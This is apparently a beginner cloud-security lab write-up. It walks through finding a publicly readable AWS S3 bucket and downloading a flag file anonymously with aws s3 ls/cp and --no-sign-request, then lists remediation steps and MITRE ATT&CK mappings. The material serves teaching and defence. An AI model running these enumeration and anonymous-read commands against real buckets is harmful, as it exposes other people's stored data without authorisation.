# S3 Public Access Misconfiguration

**Difficulty:** Beginner | **Provider:** AWS | **Category:** Storage / Misconfiguration

## Scenario

A developer disabled the S3 **Block Public Access** setting on a data bucket and attached a bucket
policy that grants `s3:GetObject` to `*` (the anonymous principal). The bucket contains internal
files including a flag. You are given low-privilege IAM credentials that can only list buckets.

## Attack Path

```
[Attacker] IAM credentials (s3:ListAllMyBuckets only)
    |
    v
aws s3 ls  -->  enumerate owned buckets  -->  find cumulonimbus-data-<id>
    |
    v
aws s3 ls s3://<bucket> --no-sign-request  -->  anonymous list succeeds
    |
    v
aws s3 cp s3://<bucket>/flag.txt - --no-sign-request  -->  flag
```

### Step 1 — Configure the attacker profile

```bash
aws configure --profile attacker
# Enter the provided Access Key ID and Secret Access Key
# Region: eu-west-1
```

### Step 2 — List buckets

```bash
aws s3 ls --profile attacker
```

### Step 3 — Read objects anonymously

```bash
BUCKET="<bucket_name_from_output>"

# List without credentials
aws s3 ls s3://${BUCKET} --no-sign-request

# Download the flag
aws s3 cp s3://${BUCKET}/flag.txt - --no-sign-request
```

## How to Fix in Production

1. **Enable S3 Block Public Access** at the account level (`aws s3control put-public-access-block`).
2. **Never use `Principal: "*"` in bucket policies** unless you explicitly intend anonymous access.
3. **Use S3 Access Analyzer** to surface resource policies that grant public or cross-account access.
4. **Enable AWS Config rule `s3-bucket-public-read-prohibited`** for continuous compliance monitoring.
5. **Apply least-privilege IAM** — callers should authenticate with scoped roles rather than relying on public bucket policies.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Data from Cloud Storage | [T1530](https://attack.mitre.org/techniques/T1530/) |
| Cloud Storage Object Discovery | [T1619](https://attack.mitre.org/techniques/T1619/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
